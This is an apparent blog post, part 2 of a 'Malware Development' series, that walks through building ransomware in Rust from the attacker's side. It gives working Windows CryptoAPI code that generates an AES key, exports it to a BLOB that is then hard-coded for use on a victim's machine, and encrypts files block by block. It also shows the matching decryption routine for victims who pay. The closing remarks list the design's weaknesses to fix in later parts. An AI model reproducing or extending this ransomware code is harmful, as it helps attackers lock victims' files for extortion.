---
title: Rust Ransomware (Part 2)
categories:
- Malware Development
description: Rust Ransomware | Cryto and Encryption
---

# Rust Ransomware: Part 2
## Crypto and How Ransomwares encrypt your file

### 1. Ransomware and Encryption


A typical ransomware is just a malicious program that encrypts your files with some method, making them unusable, and hold it for ransom. 


If the victim wants the files back, they have to pay and have the malware author to decrypt the files.


From the attacker's point of view, we must learn how encryption works in order to achieve this unique functionality of this type of malware.


There are two types of encryption that we need to know:

- [Symmetric-key cryptography](https://en.wikipedia.org/wiki/Symmetric-key_algorithm): We can use the same cryptographic key to encrypt and decrypt our ciphertext. [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) (Advanced Encryption Standard) is a type of symmetric-key algorithm, and I am going to use it to demonstate how we can encrypt computer files later.


- [Asymmetric-key cryptography](https://en.wikipedia.org/wiki/Public-key_cryptography): Also known as public key cryptography. We can use a pair of keys (public key and private key) for our encryption and decryption. Public key is used for encryption, and private key is used for decryption. This kind of cryptography enables encryption to happen with a public information (public key) while ensuring the security of the information is maintained because only the one with the private key can decrypt it.


### 2. AES - Symmetric-key cryptography


Usually, using AES to encrypt files are incredibly fast. If we are encrypting a huge ammount of files (in this case, we want our ransomware to), we should use AES!


However, AES or symmetric-key cryptography has a problem regarding how it should work on a ransomware. 


There are a few ways we, as the attacker, can generate and use the AES keys.


- We can have our malware generate the key when it gets on the victim's computer. 


  - However, after the encryption, we have to dispose the key because we do not want the victim to have access to it.
  - We still need a copy of the key in order to decrypt their files if they pay the ransomware, so the only good way to do this is sending the key to our command & control server and disposing the key in the victim's machine.
  - One flaw this method has is that we need internet connection to send the key back. If the victim's machine is not connected to the computer, then that defeats the whole purpose of holding their files for ransom because we can't decrypt their files.


- We can pre-generate an AES key, hard-code it into our executable, and use it to encrypt when we get to the victim's machine.
  - This has the benefit that it does not matter if the machine is connected to the Internet or not, we can still decrypt their files if the victim pays the ransom.
  - I have seen a few malwares do this, so I guess we can try it out! I'll point out where the strength and weakness of this method as we code it out 


#### Step 1. Get the handle to a provider


Before performing cryptographic procedures on a Windows program, we need to call [CryptAcquireContext](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptacquirecontexta) to acquire a handle to a particular key container within a particular cryptographic service provider (CSP). 


Each CSP has the ability to perform certain crytographic services that we need to pick as the parameter for the function


``` rust
  let mut h_crypt_prov: HCRYPTPROV = 0usize; // h_crypt_prov is our handle to the key container

  CryptAcquireContextA(
      &mut h_crypt_prov,  // phProv, our handle to the key container
      null_mut(),         // szContainer, the key container name.
      null_mut(),         // szProvider, name of CSP to be used
      PROV_RSA_AES,       // dwProvType, cryptographic provider type
      CRYPT_VERIFYCONTEXT,// dwFlags, flag values
  );
```

- **phProv**: For this parameter, we pass in our mutable handle to the key container(which is 0 originally). If this function succeeds, then our handle will be populate with a handle value for a key container
- **szContainer** and **szProvider**: Since we don't need to specify these, we can just leave them as null. The function will use the default name.
- **dwProvType**: Possible values for this can be found [here](https://docs.microsoft.com/en-us/windows/win32/seccrypto/cryptographic-provider-types). Since we are using AES encryption, we need to choose the provider type of [PROV_RSA_AES](https://docs.microsoft.com/en-us/windows/win32/seccrypto/prov-rsa-aes).
- **dwFlags**: *CRYPT_VERIFYCONTEXT* is the flag to set if we only need to do encryption!


At this point, we have had a handle to the key container. We can now generate our AES key.


#### Step 2. Generate AES key


After getting a handle to the key container, let's generate an AES 192-bit key!


``` rust
    let mut h_key: HCRYPTKEY = 0usize; // our AES key

    CryptGenKey(
        h_crypt_prov,                   // hProv, handle to key container
        CALG_AES_192,                   // Algid, algorithm ID
        0x00C00000 | CRYPT_EXPORTABLE,  // dwFlags, specifies the type of key generated
        &mut h_key,                     // phKey, mutable pointer to our key
    );
```


- **Algid**: The algorithm ID. Since we need an AES 192-bit key, we can choose *CALG_AES_192*. Other choices are available [here](https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id) for other algorithms.
- **dwFlags**: First 16 bits represent the key length, last 16 bits represent the key's characteristics. Since the first 16 bits are ***0xC0***, we specify that our key is 192 bits. For the last 16 bits, *CRYPT_EXPORTABLE* lets us later export it into a blob!
- **phKey**: a mutable pointer to our key so the function can change this to a key.


At this point, *h_key* should be populate by an AES 192-bit key, and it should look something like this ***0x2a20a096920*** when you print it out.


#### 3. Export the AES key.


Now that we have got a key, we can start encrypting on our own computer. However, this key won't work on any other computer.


The reason is that it needs to have a compatible CSP in order to work. 


This is why we must use [CryptExportKey](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptexportkey) function to export it into a key BLOB (a struct to store the key).


Once the key is exported into the BLOB, we can transport this BLOB to any machine. That machine can just call [CryptImportKey](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptimportkey) to import the key from the BLOB that should be compatible with the running CSP on that machine!

First, we need to get the length of the BLOB so we can allocate memory for it in memory.

``` rust
    let mut blob_length: u32 = 0;
    CryptExportKey(
        h_key,              // hKey, our key
        0,                  // hExpKey, exchange key
        PLAINTEXTKEYBLOB,   // dwBlobType, BLOB type to export into
        0,                  // dwFlags, flags
        null_mut(),         // pbData, buffer to export key into
        &mut blob_length);  // pdwDataLen, pointer to a u32 containing the size of the blop
```


- **hExpKey**: The exchange key. We can choose to encrypt our key when it's being exported into the BLOB by this key. Since we don't need this, we can just leave it as 0.
- **dwBlobType**: The BLOB type. Since we are not doing public key cryptography, ***PLAINTEXTKEYBLOB*** should be fine.
- **dwFlags**: additional flags value. Usually we don't need this.
- **pbData**: buffer to export key into. If we set this to null, nothing will be written.
- **pdwDataLen**: pointer to the size of the BLOB to write. Even though **pbData** is null, this value will still get updated with the size of the BLOB. We can use this to allocate memory for our buffer.


Next, we allocate the buffer and export the key in there.

``` rust
    let mut blob_buffer: Vec<u8> = Vec::new(); // allocate the buffer
    blob_buffer.resize(blob_length, 0u8);      // setting the size to blob_length and fill it with 0.

    CryptExportKey(
        h_key,              // hKey, our key
        0,                  // hExpKey, exchange key
        PLAINTEXTKEYBLOB,   // dwBlobType, BLOB type to export into
        0,                  // dwFlags, flags
        blob_buffer.as_mut_ptr(),         // pbData, buffer to export key into
        &mut blob_length);  // pdwDataLen, pointer to a u32 containing the size of the blop
```

Here, we allocate a buffer of bytes (u8) with the size of *blob_length*.


Then, we pass the mutable pointer of the buffer to **pbData** field of CryptExportKey. After this function is called, the buffer should be written with the BLOB.


If we print the buffer out, we should see an array like this.

```
[8, 2, 0, 0, 15, 102, 0, 0, 24, 0, 0, 0, 8, 68, 217, 142, 222, 209, 85, 216, 44, 88, 2, 170, 248, 210, 84, 119, 53, 196, 64, 96, 252, 205, 231, 229]
```


Our buffer's first few bytes is currently containing what is called a [BLOBHEADER](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/ns-wincrypt-publickeystruc). It contains the following:


- **bType**: The first byte. The BLOB type
- **bVersion**: The second byte. The BLOB version
- **reserved**: The next two bytes. Reserved
- **aiKeyAlg**: The next 4 bytes. The algorithm ID describing the key.


#### 4. Import the key (on victim's machine)


Now, our AES key is stored in the above blob buffer. We can start using this BLOB on foreign computer.


On a new machine, we can just get the key container and import this pre-coded BLOB.


``` rust
    let mut h_key: HCRYPTKEY = 0usize; // key
    let mut h_crypt_prov: HCRYPTPROV = 0usize;

    CryptAcquireContextA(
        &mut h_crypt_prov,  // phProv, our handle to the key container
        null_mut(),         // szContainer, the key container name.
        null_mut(),         // szProvider, name of CSP to be used
        PROV_RSA_AES,       // dwProvType, cryptographic provider type
        CRYPT_VERIFYCONTEXT,// dwFlags, flag values
    );


    let mut blob_buffer: Vec<u8> = [
        8, 2, 0, 0, 15, 102, 0, 0, 24, 0, 0, 0, 8, 68, 217, 142, 222, 209, 85, 216, 44, 88, 2,
        170, 248, 210, 84, 119, 53, 196, 64, 96, 252, 205, 231, 229,
    ]
    .to_vec();

    CryptImportKey(
        h_crypt_prov,               // hProv, handle to key container
        blob_buffer.as_ptr(),       // pbData, BLOB buffer
        blob_buffer.len() as u32,   // dwDataLen, length of BLOB
        0,                          // hPubKey, handle to public key
        0,                          // dwFlags, flags only used to public/private key pairs
        &mut h_key,                 // phKey, mutable pointer to the key to extract
    );
```


After finish importing, we will see our key value in *h_key*. 


This key does not look exactly the same as the original key we generated, but it should work if we use it to encrypt and decrypt thanks to AES mathematical clutchness.



#### 5. Encrypt file


With the key imported from the BLOB, we can start encrypting any file we want.


First, we need to create a handle for a source file and the destination file with [CreateFileA](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea).



``` rust
    let source_handle: HANDLE = CreateFileA(
            CString::new(
                "C:\\Users\\chuon\\OneDrive\\Desktop\\Rust-Ransomware\\testing_ransom\\source.txt",
            )
            .unwrap()
            .as_ptr(),
            FILE_READ_DATA,
            FILE_SHARE_READ,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
    );

    let mut dest_handle: HANDLE = CreateFileA(
        CString::new("C:\\Users\\chuon\\OneDrive\\Desktop\\Rust-Ransomware\\testing_ransom\\encrypted.txt").unwrap().as_ptr(),
        FILE_WRITE_DATA,
        FILE_SHARE_READ,
        null_mut(),
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        null_mut(),
    );

```


We want to create a readable handle to the source file and a writable for the destination file. When we read from the source file into the buffer, we can encrypt the buffer and then write back to the destination file.


``` rust
    let mut block_len: u32 = 960;                   // Encrypting block length, 192 * 5
    let mut buffer_len: u32 = 960;                  // Reading buffer length, 192 * 5

    let mut pb_buffer: Vec<u8> = Vec::new();        // allocate write buffer
    pb_buffer.resize(buffer_len as usize, 0u8);     

    let mut EOF = 0;                                // end of file, loop until reach the end
    let mut count = 0;
    while EOF == 0 {
        if ReadFile(                                // Read 960 bytes (block length) into the buffer each time
            source_handle,
            pb_buffer.as_ptr() as *mut _,
            block_len,
            &mut count,
            null_mut(),
        ) == 0
        {
            println!("Error reading");
            break;
        }
        println!("count {}", count);
        if count < block_len {                      // if number of bytes read is less than block length, we reach the EOF
            EOF = 1;
        }

        if CryptEncrypt(                            // encrypt the buffer
            h_key,
            0,
            EOF,
            0,
            pb_buffer.as_ptr() as *mut u8,
            &mut count,
            buffer_len,
        ) == 0
        {
            println!("Fail to encrypt 0x{:x}", GetLastError());
            break;
        }

        if WriteFile(                               // Write it back into the destination file 
            dest_handle,
            pb_buffer.as_ptr() as *const _,
            count,
            &mut count,
            null_mut(),
        ) == 0
        {
            println!("Fail to write");
            break;
        }
    }
```


As a result of this, we will be having a fully encrypted file by encrypting with our AES key.


  ![alt text](/uploads/encrypted.JPG)



#### 6. Decryption


In order to decrypt the file in case where the victim pays the ransom, we can just do the exact same thing with [CryptDecrypt](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptdecrypt).


``` rust
    let mut EOF = 0;
    let mut count = 0;

    pb_buffer = Vec::new();
    pb_buffer.resize(buffer_len as usize, 0u8);

    while EOF == 0 {
        if ReadFile(
            dest_handle,
            pb_buffer.as_ptr() as *mut _,
            block_len,
            &mut count,
            null_mut(),
        ) == 0
        {
            println!("Error reading 0x{:x}", GetLastError());
            break;
        }
        println!("count {}", count);
        if count < block_len {
            EOF = 1;
        }

        //CryptDecrypt(h_key, 0, EOF, 0, pb_buffer.as_mut_ptr(), &mut dw_count)

        if CryptDecrypt(h_key, 0, EOF, 0, pb_buffer.as_mut_ptr(), &mut count) == 0 {
            println!("Fail to decrypt 0x{:x}", GetLastError());
            break;
        }

        if WriteFile(
            decrypt_handle,
            pb_buffer.as_ptr() as *const _,
            count,
            &mut count,
            null_mut(),
        ) == 0
        {
            println!("Fail to write");
            break;
        }
    }

```


### 3. Remark


We have just finished implementing our AES file encryption algorithm for the ransomware! However, there are tons of flaws in our current method


Since we are hard-coding our BLOB and using the same BLOB for every file and every victim machine, if one person pays the ransom, they can distribute this key to everyone else.


Also, this is too easy for reverse engineers to get the entire BLOB out from the source code. If you try putting our executable into IDA, you should see something like this.


  ![alt text](/uploads/IDA.JPG)


The BLOB is fully visible on the stack if we run it through a debugger. With this information, reverse engineers can simply write a decrypting tool and release it for anyone to use, which defeats our ransomware's purpose.


I feel like this is a good stopping point, and we can just our encrypting algorithm in a later post! 
